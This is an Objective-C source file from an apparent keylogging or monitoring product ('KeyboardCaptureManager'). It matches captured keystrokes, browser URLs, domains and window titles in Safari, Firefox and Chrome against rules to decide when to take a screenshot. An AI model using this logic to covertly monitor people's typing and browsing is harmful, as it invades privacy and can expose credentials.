//
//  KeyLogRuleHelper.m
//  KeyboardCaptureManager
//
//  Created by Makara Khloth on 1/27/15.
//
//

#import "KeyLogRuleHelper.h"
#import "KeyStrokeInfo.h"
#import "KeyLogRule.h"
#import "ScreenshotUtils.h"
#import "DateTimeFormat.h"

@interface KeyLogRuleHelper (private)
+ (NSString*)domainFromUrl:(NSString*)url;
+ (NSString *) domainFromUrl1: (NSString *) aUrl;
@end

@implementation KeyLogRuleHelper

+ (BOOL) matchingMonitorApps: (NSArray *) aMonitorApps toKeyInfo: (KeyStrokeInfo *) aKeyStrokeInfo {
    BOOL matchedApplication = false;
    for (int i =0; i<[aMonitorApps count]; i++) {
        if ([[aKeyStrokeInfo mAppBundle]isEqualToString:[aMonitorApps objectAtIndex:i]]) {
            matchedApplication = true;
            break;
        }
    }
    return (matchedApplication);
}

+ (BOOL) matchingKeyLogRuleApps: (id) aKeyLogRules toKeyInfo: (KeyStrokeInfo *) aKeyStrokeInfo {
    BOOL matchedRuleApp = NO;
    for (int i=0; i<[aKeyLogRules count]; i++) {
        NSMutableArray * ruleAtIndex = [[[aKeyLogRules objectAtIndex:i] mutableCopy] autorelease];
        NSString *ruleBundleID = [ruleAtIndex objectAtIndex:0];
        if ([[aKeyStrokeInfo mAppBundle] isEqualToString:ruleBundleID]) {
            matchedRuleApp = YES;
            break;
        }
    }
    return (matchedRuleApp);
}

+ (BOOL) matchingKeyLogRules: (id) aKeyLogRules toKeyInfo: (KeyStrokeInfo *) aKeyStrokeInfo {
    BOOL matchedRule = NO;
    for (int i=0; i<[aKeyLogRules count]; i++) {
        /*
         Array of array, each element is a rule
            - 0, bundle ID
            - 1, text less than
            - 2, domain
            - 3, url
            - 4, title keyword
         */
        NSMutableArray * ruleAtIndex = [[[aKeyLogRules objectAtIndex:i] mutableCopy] autorelease];
        KeyLogRule * rule = [[[KeyLogRule alloc]init] autorelease];;
        [rule setMApplicationID:[ruleAtIndex objectAtIndex:0]];
        [rule setMTextLessThan:[[ruleAtIndex objectAtIndex:1]intValue]];
        [rule setMDomain:[ruleAtIndex objectAtIndex:2]];
        [rule setMURL:[ruleAtIndex objectAtIndex:3]];
        [rule setMTitleKeyword:[ruleAtIndex objectAtIndex:4]];
        
        DLog(@"--------------- rule%d start --------------------", i);
        DLog(@"bundle ID: %@",[rule mApplicationID]);
        DLog(@"text less than: %ld",(long)[rule mTextLessThan]);
        DLog(@"domain: %@",[rule mDomain]);
        DLog(@"url: %@",[rule mURL]);
        DLog(@"title keyword: %@",[rule mTitleKeyword]);
        DLog(@"--------------- rule%d end --------------------", i);
        
        NSString *myUrl = [[aKeyStrokeInfo mUrl] lowercaseString];
        NSString *ruleUrl = [[rule mURL] lowercaseString];
        DLog(@"myUrl %@",myUrl)
        DLog(@"ruleUrl %@",ruleUrl)
        
        NSString *myDomain = [[self domainFromUrl1:[aKeyStrokeInfo mUrl]] lowercaseString];
        //NSString *ruleDomain = [[self domainFromUrl1:[rule mDomain]] lowercaseString];
        NSString *ruleDomain = [[rule mDomain] lowercaseString];
        DLog(@"myDomain %@",myDomain)
        DLog(@"ruleDomain %@",ruleDomain)
        
        NSString * myWord = [[aKeyStrokeInfo mWindowTitle] lowercaseString];
        NSString * ruleWord = [[rule mTitleKeyword] lowercaseString];
        DLog(@"myWord %@",myWord)
        DLog(@"ruleWord %@",ruleWord)
        
        if ([[rule mApplicationID]isEqualToString:[aKeyStrokeInfo mAppBundle]]) {
            DLog(@"######################## Application Match the rule ########################");
            
            if ([[rule mApplicationID]isEqualToString:@"com.apple.Safari"] ||
                [[rule mApplicationID]isEqualToString:@"org.mozilla.firefox"] ||
                [[rule mApplicationID]isEqualToString:@"com.google.Chrome"]) {
                DLog(@"######################## Browser Match the rule ########################");
                
                if ([[aKeyStrokeInfo mKeyStrokeDisplay] length]<= [rule mTextLessThan]) {
                    DLog(@"######################## TextLessThan Match the rule ########################");
                    
                    if([[rule mDomain] length]>0){
                        DLog(@"######################## Have Domain rule ########################");
                        
                        if ([myDomain isEqualToString:ruleDomain]) {
                            DLog(@"######################## Domain Match the rule ########################");
                            
                            if ([[rule mURL]length]>0) {
                                DLog(@"######################## Have URL rule ########################");
                                
                                if ([myUrl rangeOfString:ruleUrl].location != NSNotFound) {
                                    DLog(@"######################## URL Match the rule ########################");
                                    
                                    if ([[rule mTitleKeyword]length]>0) {
                                        DLog(@"######################## Have Title Keyword rule ########################");
                                        
                                        if ([myWord rangeOfString:ruleWord].location != NSNotFound) {
                                            DLog(@"######################## take Photo ########################");
                                            
                                            matchedRule = YES;
                                            break;
                                        }
                                    }else{
                                        DLog(@"######################## Do Not Have Title Keyword rule ########################");
                                        DLog(@"######################## take Photo ########################");
                                        
                                        matchedRule = YES;
                                        break;
                                    }
                                }
                            }else{
                                DLog(@"######################## Do Not Have URL rule ########################");
                                
                                if ([[rule mTitleKeyword]length]>0) {
                                    DLog(@"######################## Have Title Keyword rule ########################");
                                    
                                    if ([myWord rangeOfString:ruleWord].location != NSNotFound) {
                                        DLog(@"######################## take Photo ########################");
                                        
                                        matchedRule = YES;
                                        break;
                                    }
                                }else{
                                    DLog(@"######################## Do Not Have Title Keyword rule ########################");
                                    DLog(@"######################## take Photo ########################");
                                    
                                    matchedRule = YES;
                                    break;
                                }
                            }
                        }
                    }else{
                        DLog(@"######################## Do Not Have Domain rule ########################");
                        
                        if ([[rule mURL]length]>0) {
                            DLog(@"######################## Have URL rule ########################");
                            
                            if ([myUrl rangeOfString:ruleUrl].location != NSNotFound) {
                                DLog(@"######################## URL Match the rule ########################");
                                
                                if ([[rule mTitleKeyword]length]>0) {
                                    DLog(@"######################## Have Title Keyword rule ########################");
                                    
                                    if ([myWord rangeOfString:ruleWord].location != NSNotFound) {
                                        DLog(@"######################## take Photo ########################");
                                        
                                        matchedRule = YES;
                                        break;
                                    }
                                }else{
                                    DLog(@"######################## Do Not Have Title Keyword rule ########################");
                                    DLog(@"######################## take Photo ########################");
                                    
                                    matchedRule = YES;
                                    break;
                                }
                            }
                        }else{
                            DLog(@"######################## Do Not Have URL rule ########################");
                            
                            if ([[rule mTitleKeyword]length]>0) {
                                DLog(@"######################## Have Title Keyword rule ########################");
                                
                                if ([myWord rangeOfString:ruleWord].location != NSNotFound) {
                                    DLog(@"######################## take Photo ########################");
                                    
                                    matchedRule = YES;
                                    break;
                                }
                            }else{
                                DLog(@"######################## Do Not Have Title Keyword rule ########################");
                                DLog(@"######################## take Photo ########################");
                                
                                matchedRule = YES;
                                break;
                            }
                        }
                    }
                }
            }else{
                DLog(@"######################## Non-Browser Match the rule ########################");
                
                if ([[aKeyStrokeInfo mKeyStrokeDisplay] length]<= [rule mTextLessThan]) {
                    DLog(@"######################## take Photo ########################");
                    
                    matchedRule = YES;
                    break;
                }
            }
        }
    }
    return (matchedRule);
}

+ (NSString*)domainFromUrl:(NSString*)url {
    NSArray *first = [url componentsSeparatedByString:@"/"];
    for (NSString *part in first) {
        if ([part rangeOfString:@"."].location != NSNotFound){
            part = [part stringByReplacingOccurrencesOfString:@"www." withString:@""];
            return part;
        }
    }
    return nil;
}

+ (NSString*)domainFromUrl1:(NSString*)aUrl {
    NSURL *theUrl = [NSURL URLWithString:aUrl];
    return ([theUrl host]);
}
    
@end
